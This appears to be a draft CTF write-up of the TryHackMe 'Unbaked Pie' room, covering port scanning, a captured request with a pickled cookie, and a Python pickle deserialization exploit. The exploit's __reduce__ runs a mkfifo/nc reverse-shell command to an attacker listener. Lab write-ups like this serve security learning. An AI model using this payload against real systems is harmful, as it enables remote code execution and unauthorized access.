---
title: "Unbaked Pie"
categories:
 - tryhackme
tags:
 - linux
 - medium
 - writeups
author_profile: true
published: false
---

[Room](https://tryhackme.com/room/unbakedpie)

> nmap

`nmap -p- -v --min-rate 10000 $IP -Pn`

```
Port 	5003 	HTTP 	OPEN
```

> web enumeration

The login and signup doesn't seem to work

When a POST request for search is done, we can interesting cookies there.
```
Host: 10.10.23.146:5003
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.23.146:5003/
Content-Type: application/x-www-form-urlencoded
Content-Length: 99
Origin: http://10.10.23.146:5003
DNT: 1
Connection: keep-alive
Cookie: csrftoken=rumeY1BZpmCT5J03AbFG7p2YG1rfdnQIIz8iNjJ7RWOf5KjK04z2qwJc98IurvFS; search_cookie="gASVCwAAAAAAAACMB2Zqa2FkbGaULg=="
Upgrade-Insecure-Requests: 1
```

`search_cookie` seems like its using python pickle 

Try a RCE with python pickle exploit 

```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc $IP 1234 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

Run the above script and replace the `search-cookie` value with above, also listen at specified port.
You should be getting a temporary shell.

